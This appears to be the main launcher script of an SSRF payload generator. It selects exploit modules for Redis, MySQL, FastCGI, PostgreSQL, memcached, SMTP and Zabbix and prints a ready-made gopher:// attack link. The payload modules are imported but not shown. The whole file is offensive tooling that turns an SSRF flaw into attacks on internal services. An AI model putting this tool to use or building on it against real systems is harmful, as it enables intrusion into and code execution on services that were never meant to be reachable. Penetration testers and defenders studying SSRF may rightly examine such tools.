#!/usr/bin/env python3
import argparse
import sys
from .module import DumpMemcached, FastCGI, MySQL, PHPMemcached, PlainText, PostgreSQL, PyMemcached, Redis, RbMemcached, SMTP, Zabbix
from .piper import LineN, LineRN, EndWith00, Default
import logging as log

class_map = {
    "dmpmemcache": DumpMemcached.DumpMemcached,
    "fastcgi": FastCGI.FastCGI,
    "mysql": MySQL.MySQL,
    "phpmemcache": PHPMemcached.PHPMemcached,
    "plaintext": PlainText.PlainText,
    "postgresql": PostgreSQL.PostgreSQL,
    "pymemcache": PyMemcached.PyMemcached,
    "rbmemcache": RbMemcached.RbMemcached,
    "redis": Redis.Redis,
    "smtp": SMTP.SMTP,
    "zabbix": Zabbix.Zabbix
}

piper_map = {
    "line-n": LineN,
    "line-rn": LineRN,
    "end-with-00": EndWith00,
    "default": Default
}

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--exploit",
                        help="exploit type", choices=class_map.keys())
    parser.add_argument("--host", help="gopher host", default="127.0.0.1")
    parser.add_argument("--port", help="gopher port", default=0)
    parser.add_argument("-v","--verbose", help="verbose mode", action="count", default=0)
    parser.add_argument("--dump", help="dump generator status", action="store_true")
    parser.add_argument("--slient", help="slient mode, stdout will only contain url", action="store_true")
    parser.add_argument("--post", help="post processor type: line-n is \\n line-rn is \r\n end-with-00 is auto append 00 at End", choices=["line-n", "line-rn", "end-with-00"], default="line-n")
    args, unknown = parser.parse_known_args()

    with open("banner", "r") as banner:
        if not args.slient:
            print("\033[96m",banner.read(), "\033[0m")

    if(args.verbose == 0):
        log.basicConfig(level=log.INFO)
    else:
        log.basicConfig(level=log.DEBUG)
    if(not args.exploit):
        print(parser.print_help())
        sys.exit(1)
    options = {
        "host": args.host,
        "port": args.port,
    }
    
    try:
        exploit = class_map[args.exploit](parser,options)
    except KeyError:
        print(parser.print_help())
        sys.exit(1)

    if args.dump:
        print("Dump status of generator needs to set debug mode -v")
        exploit.debug_dump()
        sys.exit(0)

    if args.post :
        pipe_parser = piper_map[args.post]
    else:
        pipe_parser = Default

    final_payload = pipe_parser().pipe(exploit.generate())
    if args.slient:
        print(final_payload)
        sys.exit(0)
    else:
        print("\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
        print("\033[04m" + final_payload + "\033[0m")
        print("\n" + "\033[41m" +"-----------Made-by-Skyworship-----------"+"\033[0m")

    exploit.tailcall()
if __name__ == "__main__":
    main()